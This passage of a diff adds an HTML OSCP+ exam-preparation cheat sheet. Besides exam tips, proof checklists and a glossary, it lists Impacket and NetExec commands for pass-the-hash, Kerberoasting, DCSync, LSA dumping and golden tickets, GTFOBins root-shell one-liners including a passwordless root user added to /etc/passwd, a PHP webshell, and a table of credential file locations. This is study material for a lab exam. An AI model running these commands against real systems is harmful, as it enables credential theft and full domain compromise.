+        <tr><td>CVE-2022-26134 Confluence</td><td>OGNL injection 7.4.17</td><td><span class="impact">→ RCE</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>SearchSploit Workflow</h3>
+  <pre data-lang="bash"><code>searchsploit apache 2.4
+searchsploit "windows smb" remote
+searchsploit -w openssh 7.2           # Show Exploit-DB URL
+searchsploit -m 47837                 # Copy exploit to CWD
+searchsploit -x 47837                 # Examine without copying
+searchsploit -u                       # Update DB</code></pre>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S12 ═══════════════════ -->
+<section class="section" id="s12">
+  <div class="section-header">
+    <span class="section-num">12</span>
+    <h2>Exam Day Tips</h2>
+  </div>
+
+  <h3>Before Starting (15 min prep)</h3>
+  <ul class="checklist">
+    <li>VPN connected — verify routing: ping &lt;DC_IP&gt;</li>
+    <li>Note all IPs: DC, MS01, MS02, Box1, Box2, Box3</li>
+    <li>Update /etc/hosts with all IPs</li>
+    <li>Create loot structure: <code>mkdir -p ~/exam/{ad/{ms01,ms02,dc},box{1,2,3}}/{scans,loot,exploits,screenshots}</code></li>
+    <li>Start nmap scans on ALL targets immediately</li>
+    <li>Open notes per machine (CherryTree / Obsidian)</li>
+    <li>Screenshot tool ready (Flameshot: <code>flameshot gui</code>)</li>
+    <li>Start tmux: 1 window per machine</li>
+    <li>Write provided AD credentials FIRST in notes</li>
+  </ul>
+
+  <h3>Critical Exam Rules</h3>
+  <pre data-lang="bash"><code># Every flag screenshot MUST show:
+# Linux:
+cat /root/proof.txt &amp;&amp; whoami &amp;&amp; hostname &amp;&amp; ip addr show
+
+# Windows:
+type C:\Users\Administrator\Desktop\proof.txt &amp; whoami &amp; hostname &amp; ipconfig /all</code></pre>
+
+  <div class="callout red">
+    <strong>Metasploit:</strong> ONLY 1 machine. Choose wisely — use on a stuck standalone, not on AD (manual AD is better for report anyway).
+  </div>
+
+  <h3>Stuck? 15-Point Reset Checklist</h3>
+  <ul class="checklist">
+    <li>Did full port scan finish? (<code>-p-</code> not just top 1000)</li>
+    <li>Did UDP scan run? (SNMP=161 especially)</li>
+    <li>Read ALL web page source code? (Ctrl+U in browser)</li>
+    <li>Checked robots.txt, /.git, /.env, /backup?</li>
+    <li>Tried ALL found credentials on ALL services?</li>
+    <li>Default credentials tried? (admin:admin, admin:password)</li>
+    <li>Exact version numbers googled for CVEs?</li>
+    <li>searchsploit run on every service+version?</li>
+    <li>All SMB shares checked and files downloaded?</li>
+    <li>SQL injection tested on every input field?</li>
+    <li>LFI tested on every file/page parameter?</li>
+    <li>linpeas/winpeas output fully read? (especially yellow/red)</li>
+    <li>sudo -l, SUID, capabilities, cron all checked?</li>
+    <li>Interesting file search done? (.conf, .bak, history files)</li>
+    <li>Is there a simpler path I'm overthinking?</li>
+  </ul>
+
+  <h3>AD-Specific Tips</h3>
+  <ul class="checklist">
+    <li>Start with provided creds → BloodHound FIRST</li>
+    <li>Check ALL user descriptions for passwords (very common in OSCP)</li>
+    <li>Check SYSVOL/GPP within first 10 minutes</li>
+    <li>Kerberoast + AS-REP roast immediately</li>
+    <li>Password reuse is extremely common — spray everywhere</li>
+    <li>BloodHound "Shortest Path to DA" → follow it literally</li>
+    <li>Any GenericAll/WriteDACL/GenericWrite ACE → exploit immediately</li>
+    <li>Check MSSQL linked servers — common lateral movement path</li>
+    <li>After owning MS01 → re-run SharpHound from inside</li>
+  </ul>
+
+  <h3>Common Rabbit Holes (Avoid)</h3>
+  <div class="callout red">
+    <strong>✗ Kernel exploits</strong> before trying anything else &nbsp;|&nbsp;
+    <strong>✗ SSH brute force</strong> with full rockyou &nbsp;|&nbsp;
+    <strong>✗ Ignoring UDP</strong> entirely &nbsp;|&nbsp;
+    <strong>✗ Spending &gt;45 min</strong> on one vector &nbsp;|&nbsp;
+    <strong>✗ Forgetting</strong> PS history (ConsoleHost_history.txt) &nbsp;|&nbsp;
+    <strong>✗ Not checking</strong> web.config for DB creds &nbsp;|&nbsp;
+    <strong>✗ Giving up</strong> without GTFObins on every SUID
+  </div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S13 ═══════════════════ -->
+<section class="section" id="s13">
+  <div class="section-header">
+    <span class="section-num">13</span>
+    <h2>Proof Collection Checklist</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Don't lose points here</span>
+    <p><strong>Hacking the box is only half the job — you must <em>prove</em> it, or you score zero for that machine.</strong> Students genuinely fail the exam for sloppy proof: a flag screenshot that doesn't also show <code>whoami</code> and <code>ip addr</code> may not be accepted, because it doesn't prove <em>which</em> machine you were on or what privilege you had.</p>
+    <p><strong>Build the habit:</strong> the moment you read a flag, take the full screenshot (flag + <code>whoami</code>/<code>id</code> + <code>hostname</code> + IP) <em>immediately</em>, before doing anything else. Shells die. Take the proof while you have it. The exact commands are below — paste them as one line.</p>
+  </div>
+
+  <h3>Required Screenshot Commands</h3>
+  <pre data-lang="bash"><code># Linux local.txt (unprivileged):
+cat /home/&lt;USERNAME&gt;/local.txt &amp;&amp; whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; ip addr show
+
+# Linux proof.txt (root):
+cat /root/proof.txt &amp;&amp; whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; ip addr show
+
+# Windows local.txt:
+type C:\Users\&lt;USERNAME&gt;\Desktop\local.txt &amp; whoami &amp; hostname &amp; ipconfig
+
+# Windows proof.txt (SYSTEM / Administrator):
+type C:\Users\Administrator\Desktop\proof.txt &amp; whoami /all &amp; hostname &amp; ipconfig /all
+
+# If not found:
+find / -name "*.txt" 2&gt;/dev/null | xargs grep -l "OS{" 2&gt;/dev/null
+dir /s /b C:\*.txt 2&gt;nul | findstr "local\|proof"</code></pre>
+
+  <h3>Points Tracker</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Machine</th><th>Flag</th><th>Points</th><th>Flag Value</th><th>Screenshot</th></tr></thead>
+      <tbody>
+        <tr><td>AD MS01</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>AD MS02</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>AD DC01</td><td>proof.txt</td><td>20 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 1</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 1</td><td>proof.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 2</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 2</td><td>proof.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 3</td><td>local.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+        <tr><td>Box 3</td><td>proof.txt</td><td>10 pts</td><td>____________</td><td>☐</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout green">
+    <strong>TOTAL: ___ / 100 pts &nbsp;|&nbsp; PASS THRESHOLD: 70 pts</strong>
+  </div>
+
+  <h3>Pre-Report Checks</h3>
+  <ul class="checklist">
+    <li>All screenshots show: flag + whoami + hostname + IP</li>
+    <li>Notes detailed enough to recreate each attack step</li>
+    <li>All commands documented for 24hr report</li>
+    <li>Metasploit NOT used on more than 1 machine</li>
+    <li>Report template ready</li>
+  </ul>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S14 ═══════════════════ -->
+<section class="section" id="s14">
+  <div class="section-header">
+    <span class="section-num">14</span>
+    <h2>Quick Reference Card</h2>
+  </div>
+
+  <h3>Listeners</h3>
+  <pre data-lang="bash"><code>nc -lvnp 4444
+rlwrap nc -lvnp 4444      # With readline</code></pre>
+
+  <h3>Impacket Cheatsheet</h3>
+  <pre data-lang="bash"><code>psexec.py dom/user:pass@&lt;IP&gt;                          # SYSTEM via SMB
+wmiexec.py dom/user:pass@&lt;IP&gt;                         # semi-interactive WMI
+smbexec.py dom/user:pass@&lt;IP&gt;                         # no binary on disk
+
+# Hash (PTH):
+psexec.py dom/user@&lt;IP&gt; -hashes :&lt;NTLM_HASH&gt;
+wmiexec.py dom/user@&lt;IP&gt; -hashes :&lt;NTLM_HASH&gt;
+
+# AD attacks:
+GetUserSPNs.py dom/user:pass -dc-ip &lt;DC_IP&gt; -request   # Kerberoast
+GetNPUsers.py dom/user:pass -dc-ip &lt;DC_IP&gt; -request    # AS-REP
+secretsdump.py dom/user:pass@&lt;DC_IP&gt; -just-dc          # DCSync
+getST.py -spn cifs/&lt;FQDN&gt; -impersonate Admin dom/user:pass -dc-ip &lt;DC_IP&gt;  # S4U2Self
+ticketer.py -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;SID&gt; -domain dom Admin</code></pre>
+
+  <h3>nxc (NetExec) Cheatsheet</h3>
+  <pre data-lang="bash"><code>nxc smb &lt;IP&gt; -u user -p pass                            # Test creds
+nxc smb &lt;IP&gt; -u user -H &lt;NTLM_HASH&gt;                    # PTH
+nxc smb &lt;SUBNET&gt;/24 -u user -p pass --continue-on-success
+nxc smb &lt;IP&gt; -u user -p pass --shares --users --pass-pol
+nxc smb &lt;IP&gt; -u user -p pass --sam --lsa
+nxc smb &lt;IP&gt; -u user -p pass -M lsassy
+nxc smb &lt;IP&gt; -u user -p pass -M gpp_password
+nxc smb &lt;IP&gt; -u user -p pass -x "whoami"
+nxc winrm &lt;IP&gt; -u user -p pass
+nxc mssql &lt;IP&gt; -u sa -p pass --local-auth
+nxc mssql &lt;IP&gt; -u sa -p pass -q "SELECT @@version"</code></pre>
+
+  <h3>GTFObins Quick Reference</h3>
+  <pre data-lang="bash"><code>sudo find . -exec /bin/bash \; -p
+python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
+perl -e 'exec "/bin/bash"'
+awk 'BEGIN {system("/bin/bash")}'
+sudo vim -c ':!/bin/bash'
+sudo less /etc/hosts → !/bin/bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd</code></pre>
+
+  <h3>Key File Locations</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>OS</th><th>Path</th><th>Why</th></tr></thead>
+      <tbody>
+        <tr><td>Linux</td><td>/etc/shadow</td><td>Hashes</td></tr>
+        <tr><td>Linux</td><td>/home/*/.bash_history</td><td>Command history (GOLD)</td></tr>
+        <tr><td>Linux</td><td>/home/*/.ssh/id_rsa</td><td>Private keys</td></tr>
+        <tr><td>Linux</td><td>/var/www/html/</td><td>Web configs / DB creds</td></tr>
+        <tr><td>Windows</td><td>C:\Windows\System32\config\SAM</td><td>Local hashes</td></tr>
+        <tr><td>Windows</td><td>C:\Windows\NTDS\ntds.dit</td><td>AD hashes (DC)</td></tr>
+        <tr><td>Windows</td><td>C:\inetpub\wwwroot\web.config</td><td>DB/app creds</td></tr>
+        <tr><td>Windows</td><td>PSReadLine\ConsoleHost_history.txt</td><td>PS history (GOLD)</td></tr>
+        <tr><td>Windows</td><td>C:\Windows\Panther\unattend.xml</td><td>Autologon creds</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S15 — GLOSSARY ═══════════════════ -->
+<section class="section" id="s15">
+  <div class="section-header">
+    <span class="section-num">15</span>
+    <h2>Glossary — Key Terms for Beginners</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Read me</span>
+    <p>Half the battle in OSCP is the vocabulary. If a term above confused you, find it here in plain English. Don't memorise — just understand <em>what problem each technique solves</em>.</p>
+  </div>
+
+  <h3>Core Concepts</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Term</th><th>Plain-English Meaning</th></tr></thead>
+      <tbody>
+        <tr><td>Enumeration</td><td>Information gathering. Finding every open port, service, version, file and user before attacking. The single most important skill.</td></tr>
+        <tr><td>Foothold / Initial Access</td><td>Your first shell on a target — getting <em>any</em> code execution as <em>any</em> user.</td></tr>
+        <tr><td>Privilege Escalation (PrivEsc)</td><td>Going from a low-privilege user to <code>root</code> (Linux) or <code>SYSTEM</code>/Administrator (Windows).</td></tr>
+        <tr><td>Shell</td><td>A command line on the remote machine. <em>Reverse shell</em> = target connects back to you; <em>bind shell</em> = you connect to a port the target opened.</td></tr>
+        <tr><td>Payload</td><td>The code you deliver to get a shell (e.g. a reverse-shell one-liner or an <code>msfvenom</code> binary).</td></tr>
+        <tr><td>Pivoting / Tunnelling</td><td>Using a machine you already own as a bridge to reach internal machines you can't touch directly.</td></tr>
+        <tr><td>Lateral Movement</td><td>Moving sideways from one compromised machine to another at the same privilege level.</td></tr>
+        <tr><td>Loot</td><td>Anything useful you grab post-exploitation: passwords, hashes, SSH keys, config files, history files.</td></tr>
+        <tr><td>CVE</td><td>A publicly catalogued vulnerability (e.g. CVE-2021-4034). Search them with <code>searchsploit</code>.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Linux PrivEsc Terms</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Term</th><th>Plain-English Meaning</th></tr></thead>
+      <tbody>
+        <tr><td>SUID binary</td><td>A program that runs as its <em>owner</em> (often root) no matter who launches it. If it's on GTFOBins, it's an escalation path.</td></tr>
+        <tr><td>sudo -l</td><td>Lists commands your user is allowed to run as root. Check each one against GTFOBins.</td></tr>
+        <tr><td>Cron job</td><td>A script Linux runs automatically on a schedule. If you can edit a root-owned cron script, you can run code as root.</td></tr>
+        <tr><td>Capabilities</td><td>Fine-grained root powers granted to a single binary (e.g. <code>cap_setuid</code>) — a sneaky escalation route.</td></tr>
+        <tr><td>GTFOBins</td><td>A website listing how to abuse common Linux binaries to break out to a shell or escalate.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Web Attack Terms</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Term</th><th>Plain-English Meaning</th></tr></thead>
+      <tbody>
+        <tr><td>SQL Injection (SQLi)</td><td>Sneaking database commands into an input box. Can dump credentials or, via MSSQL/xp_cmdshell, run OS commands.</td></tr>
+        <tr><td>LFI (Local File Inclusion)</td><td>Tricking a web app into reading server files it shouldn't (e.g. <code>/etc/passwd</code>). Can sometimes be escalated to code execution (log poisoning, PHP wrappers).</td></tr>
+        <tr><td>RFI (Remote File Inclusion)</td><td>Like LFI, but the app loads a file from <em>your</em> server — letting you serve a malicious payload for instant code execution.</td></tr>
+        <tr><td>Command Injection</td><td>An input that gets passed to the OS shell, letting you append your own commands (e.g. <code>; whoami</code>). Direct path to a shell.</td></tr>
+        <tr><td>File Upload Bypass</td><td>Sneaking a webshell past weak upload filters, then browsing to it to run commands.</td></tr>
+        <tr><td>SSTI (Server-Side Template Injection)</td><td>Injecting template syntax the server evaluates — often leads to remote code execution.</td></tr>
+        <tr><td>IDOR</td><td>Changing an ID in a URL/request (<code>?user_id=2</code>) to access another user's data the app forgot to protect.</td></tr>
+        <tr><td>XSS (Cross-Site Scripting)</td><td>Injecting JavaScript that runs in another user's browser. Less central to OSCP than the server-side bugs above.</td></tr>
+        <tr><td>Webshell</td><td>A small script placed on a web server (e.g. <code>&lt;?php system($_GET['cmd']); ?&gt;</code>) that lets you run commands via the browser.</td></tr>
+        <tr><td>VHost</td><td>Multiple sites served from one IP, selected by the <code>Host:</code> header. Hidden vhosts often hold the real target — always fuzz for them.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Windows / Active Directory Terms</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Term</th><th>Plain-English Meaning</th></tr></thead>
+      <tbody>
+        <tr><td>Domain Controller (DC)</td><td>The central server holding all AD users, computers and password hashes. The final boss.</td></tr>
+        <tr><td>Domain Admin (DA)</td><td>The "god mode" account over the whole Windows domain. Your goal in the AD set.</td></tr>
+        <tr><td>NTLM Hash</td><td>The stored form of a Windows password. You can often log in <em>with the hash itself</em> — no cracking needed.</td></tr>
+        <tr><td>Pass-the-Hash (PTH)</td><td>Authenticating using a stolen NTLM hash instead of the plaintext password.</td></tr>
+        <tr><td>Kerberoasting</td><td>Requesting service tickets that contain a crackable hash of a service account's password.</td></tr>
+        <tr><td>AS-REP Roasting</td><td>Grabbing a crackable hash for any account that has Kerberos pre-auth disabled — no password needed to request it.</td></tr>
+        <tr><td>DCSync</td><td>Pretending to be a Domain Controller to ask the real DC for everyone's password hashes.</td></tr>
+        <tr><td>BloodHound</td><td>A tool that maps the AD network into a graph and literally shows you the shortest path to Domain Admin.</td></tr>
+        <tr><td>ACL Abuse</td><td>Exploiting a permission someone misconfigured (e.g. you can reset another user's password) to climb privileges.</td></tr>
+        <tr><td>Golden Ticket</td><td>A forged Kerberos ticket (made from the <code>krbtgt</code> hash) that grants access to anything in the domain.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ S16 — WHEN YOU'RE STUCK ═══════════════════ -->
+<section class="section" id="s16">
+  <div class="section-header">
+    <span class="section-num">16</span>
+    <h2>When You're Stuck — Troubleshooting</h2>
+  </div>
+
+  <div class="callout learn">
+    <span class="learn-tag">Don't panic</span>
+    <p>Feeling stuck is <strong>normal</strong> and happens on every box, in the lab and in the exam. Being stuck almost never means "I need a harder exploit." It means <strong>you've missed information</strong>. Work this list top to bottom before you give up on a machine.</p>
+  </div>
+
+  <h3>The "I'm Stuck" Checklist</h3>
+  <ul class="checklist">
+    <li>Did I scan <strong>all 65,535 TCP ports</strong> (<code>nmap -p-</code>), not just the top 1000?</li>
+    <li>Did I check <strong>UDP</strong> (SNMP / TFTP / DNS often hide the foothold)?</li>
+    <li>Did I note the <strong>exact version</strong> of every service and run <code>searchsploit</code> on each?</li>
+    <li>On web: did I check <strong>source code, robots.txt, /.git, comments</strong> and brute-force directories with a <em>bigger</em> wordlist?</li>
+    <li>Did I try <strong>VHosts / subdomains</strong> (add the domain to <code>/etc/hosts</code> first)?</li>
+    <li>Did I try <strong>default, blank and anonymous credentials</strong> on every login?</li>
+    <li>Did I <strong>reuse every password/hash I've found</strong> against every other service and user?</li>
+    <li>Did I read <strong>.bash_history</strong>, PowerShell history, config files and home directories?</li>
+    <li>Did I re-run my enumeration <strong>as the new user</strong> after getting a foothold?</li>
+    <li>Is my reverse shell failing? Try a <strong>different port (80, 443, 53)</strong> — outbound filtering is common.</li>
+  </ul>
+
+  <h3>Stuck Decision Tree</h3>
+  <div class="tree-box"><span class="root">STUCK?</span>
+   │
+   ├─ <span class="leaf">No foothold yet?</span>
+   │     └─ <span class="note">→ You missed something in ENUMERATION. Re-scan all ports,</span>
+   │        <span class="note">  re-check every service version, fuzz harder, try default creds.</span>
+   │
+   ├─ <span class="leaf">Have a shell but can't escalate?</span>
+   │     └─ <span class="note">→ Run linpeas/winPEAS again. Check sudo -l, SUID, cron,</span>
+   │        <span class="note">  stored passwords. Re-enumerate AS the current user.</span>
+   │
+   ├─ <span class="leaf">Exploit won't fire?</span>
+   │     └─ <span class="note">→ Wrong version/arch? Read the exploit code. Try a</span>
+   │        <span class="note">  different PoC. Check the target can reach YOU (firewall).</span>
+   │
+   └─ <span class="win">Tried everything for 30+ min?</span>
+         └─ <span class="note">→ Move to another box. Come back with fresh eyes.</span>
+            <span class="note">  Take a short break — stepping away solves more boxes than</span>
+            <span class="note">  staring at the screen does.</span></div>
+
+  <div class="callout green">
+    <strong>✓ Exam-day reminder:</strong> You have ~24 hours. Rotating between machines when stuck is a <em>strategy</em>, not a failure. A 15-minute walk has rescued more OSCP attempts than any single tool. <strong>Enumerate everything. Try harder — but try smarter.</strong>
+  </div>
+
+  <a href="#top" class="back-top">↑ Back to top</a>
+</section>
+
+<!-- ═══════════════════ FOOTER ═══════════════════ -->
+<footer>
+  <div>
+    <span>OSCP+</span> Complete Exam Checklist &amp; Attack Chains
+  </div>
+  <div>PEN-200 v2025-26 &nbsp;|&nbsp; Built by <span>Anshuman Jha</span> &nbsp;|&nbsp; <span>Enumerate everything. Try harder.</span></div>
+</footer>
+
+</div>
+<script>
+  // ── Theme toggle ──────────────────────────────────────────
+  const html = document.documentElement;
+  const btn  = document.getElementById('theme-toggle');
+
+  function toggleTheme() {
+    const isLight = html.getAttribute('data-theme') === 'light';
+    if (isLight) {
+      html.removeAttribute('data-theme');
+      btn.textContent = '🌙';
+      localStorage.setItem('oscp-theme', 'dark');
+    } else {
+      html.setAttribute('data-theme', 'light');
+      btn.textContent = '☀️';
+      localStorage.setItem('oscp-theme', 'light');
+    }
+  }
+
+  // Apply saved theme preference immediately (no flash)
+  (function() {
+    const saved = localStorage.getItem('oscp-theme');
+    if (saved === 'light') {
+      html.setAttribute('data-theme', 'light');
+      btn.textContent = '☀️';
+    }
+  })();
+
+  // ── Beginner / Exam mode toggle ───────────────────────────
+  const modeBtn  = document.getElementById('mode-toggle');
+  const modeName = document.getElementById('mode-name');
+
+  function applyMode(mode) {
+    if (mode === 'exam') {
+      html.setAttribute('data-mode', 'exam');
+      modeBtn.innerHTML = '⚡ <span class="mt-label">Exam Mode</span>';
+      if (modeName) modeName.textContent = 'Exam';
+    } else {
+      html.setAttribute('data-mode', 'beginner');
+      modeBtn.innerHTML = '🎓 <span class="mt-label">Beginner</span>';
+      if (modeName) modeName.textContent = 'Beginner';
+    }
+  }
+
+  function toggleMode() {
+    const cur  = html.getAttribute('data-mode') === 'exam' ? 'exam' : 'beginner';
+    const next = cur === 'exam' ? 'beginner' : 'exam';
+    applyMode(next);
+    localStorage.setItem('oscp-mode', next);
+  }
+
+  // Apply saved mode (default = beginner)
+  (function() {
+    const saved = localStorage.getItem('oscp-mode');
+    applyMode(saved === 'exam' ? 'exam' : 'beginner');
+  })();
+</script>
+</body>
+</html>
